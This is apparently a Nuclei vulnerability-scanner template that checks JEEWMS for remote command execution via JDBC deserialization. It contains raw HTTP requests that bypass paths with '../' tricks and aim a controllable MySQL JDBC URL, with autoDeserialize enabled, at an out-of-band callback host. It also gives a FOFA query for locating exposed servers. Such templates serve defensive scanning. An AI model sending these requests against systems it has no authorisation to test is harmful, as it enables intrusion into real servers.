id: jeewms-dynamicDataSourceController-rce

info:
  name: JEEWMS dynamicDataSourceController - rce
  author: leadlife
  severity: critical
  description: JEEWMS is vulnerable to a remote command execution via deserialization in its DynamicDataSourceController, utilizing a controllable JDBC URL.
  reference:
    - http://wiki.fofamini.com/%E6%BC%8F%E6%B4%9E%E5%BA%93/Web%E5%AE%89%E5%85%A8/JEEWMS/JEEWMS%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: false
    fofa-query: body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro"
  tags: rce,jeewms,rce,oob

http:
  - raw:
      - |
        GET /rest/../dynamicDataSourceController.do?testConnection&driverClass=com.mysql.jdbc.Driver&url=jdbc:mysql://{{interactsh-url}}/test?detectCustomCollations=true%26autoDeserialize=true&dbUser=test_user HTTP/1.1
        Host: {{Hostname}}
      
      - |
        GET //api/..;/dynamicDataSourceController.do?testConnection&driverClass=com.mysql.jdbc.Driver&url=jdbc:mysql://{{interactsh-url}}/test?detectCustomCollations=true%26autoDeserialize=true&dbUser=test_user HTTP/1.1
        Host: {{Hostname}}
      
      - |
        GET /api/../dynamicDataSourceController.do?testConnection&driverClass=com.mysql.jdbc.Driver&url=jdbc:mysql://{{interactsh-url}}/test?detectCustomCollations=true%26autoDeserialize=true&dbUser=test_user HTTP/1.1
        Host: {{Hostname}}

    stop-at-first-match: true
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or
